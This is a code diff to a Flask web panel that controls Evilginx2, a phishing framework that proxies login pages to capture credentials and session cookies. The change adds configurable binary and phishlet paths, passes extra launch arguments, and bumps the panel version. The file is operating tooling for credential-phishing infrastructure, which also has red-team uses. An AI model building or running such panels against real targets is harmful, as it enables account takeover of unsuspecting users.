@@ -4,6 +4,7 @@
 import os
 import sys
 import json
+import shlex
 import ipaddress
 import urllib.request
 import urllib.parse
@@ -34,16 +35,17 @@ from flask_socketio import SocketIO, emit
 # ═══════════════════════════════════════════════════════════════════════════════
 
 EVILGINX_DIR    = os.environ.get("EVILGINX_DIR",    "/root/evilginx2")
-EVILGINX_BIN    = os.path.join(EVILGINX_DIR, "build", "evilginx")
+EVILGINX_BIN    = os.environ.get("EVILGINX_BIN",    os.path.join(EVILGINX_DIR, "build", "evilginx"))
 EVILGINX_CONFIG = os.environ.get("EVILGINX_CONFIG", "/root/.evilginx/config.json")
 EVILGINX_DATA   = os.environ.get("EVILGINX_DATA",   "/root/.evilginx/data.db")
-PHISHLETS_DIR   = os.path.join(EVILGINX_DIR, "phishlets")
+PHISHLETS_DIR   = os.environ.get("PHISHLETS_DIR",   os.path.join(EVILGINX_DIR, "phishlets"))
+_EGX_EXTRA      = shlex.split(os.environ.get("EVILGINX_ARGS", "") or "")
 
 PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
 PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
 PANEL_USER = os.environ.get("PANEL_USER", "root")
 PANEL_PASS = os.environ.get("PANEL_PASS", "")
-PANEL_VERSION = "3.5.8"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
+PANEL_VERSION = "3.5.9"  # keep in sync with evilginx_setup.PANEL_BUILD + templates
 
 # ═══════════════════════════════════════════════════════════════════════════════
 #  FLASK SETUP
@@ -79,8 +81,23 @@ class EvilginxManager:
         time.sleep(1)
         master, slave = pty.openpty()
         self.master_fd = master
+        phish_arg = "phishlets/"
+        if os.path.isdir(PHISHLETS_DIR):
+            stock = os.path.abspath(os.path.join(EVILGINX_DIR, "phishlets"))
+            if os.path.abspath(PHISHLETS_DIR) != stock:
+                phish_arg = PHISHLETS_DIR
+        cmd = [EVILGINX_BIN, "-p", phish_arg]
+        skip = False
+        for a in _EGX_EXTRA:
+            if skip:
+                skip = False
+                continue
+            if a in ("-p", "--phishlets"):
+                skip = True
+                continue
+            cmd.append(a)
         self.process = subprocess.Popen(
-            [EVILGINX_BIN, "-p", "phishlets/"],
+            cmd,
             stdin=slave, stdout=slave, stderr=slave,
             cwd=EVILGINX_DIR,
             preexec_fn=os.setsid,
